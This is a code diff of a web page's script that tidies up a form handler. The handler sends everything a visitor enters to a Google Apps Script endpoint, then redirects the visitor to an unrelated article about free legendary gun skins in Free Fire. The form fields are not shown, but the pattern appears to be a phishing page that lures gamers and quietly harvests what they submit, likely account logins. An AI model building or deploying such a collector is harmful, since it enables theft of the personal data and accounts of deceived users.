@@ -102,29 +102,11 @@
     </div>
     <script>
         let url='https://script.google.com/macros/s/AKfycbyqZwfTbMImwhbLqECm-pEfV9l2jexF8C1VPNrfNFiDl9k1MtOiu1yVxbCIsSA7jMNJ4A/exec'
-        let form=document.querySelector('#form');
-        form.addEventListener("submit",(e)=>{
-         let d=new FormData(form);
-         fetch(url,{
-            method:"POST",
-            body:d
-         }).then((res)=>res.text())
-         .then((finalRes)=>consol.log(finalRes))
-            e.preventDefault();
+        let form = document.querySelector('#form');
+        form.addEventListener("submit", (e) => {
+            e.preventDefault();  // Prevent the default form submission
 
-        })
-         let url='https://script.google.com/macros/s/AKfycbyqZwfTbMImwhbLqECm-pEfV9l2jexF8C1VPNrfNFiDl9k1MtOiu1yVxbCIsSA7jMNJ4A/exec'
-        let form=document.querySelector('#form');
-        form.addEventListener("submit",(e)=>{
-         let d=new FormData(form);
-         fetch(url,{
-            method:"POST",
-            body:d
-         }).then((res)=>res.text())
-         .then((finalRes)=>consol.log(finalRes))
-            e.preventDefault();
-        })
-        let formData = new FormData(form);
+            let formData = new FormData(form);
 
             fetch(url, {
                 method: "POST",
@@ -133,7 +115,8 @@
             .then((res) => res.text())
             .then((finalRes) => {
                 console.log(finalRes);  // Log the response if needed
-                window.location.href = 'https://www.sportskeeda.com/free-fire/5-best-legendary-gun-skins-free-fire';  // Redirect to another page
+                // Redirect to another page
+                window.location.href = 'https://www.sportskeeda.com/free-fire/5-best-legendary-gun-skins-free-fire';
             })
             .catch((error) => console.error('Error:', error));
         });
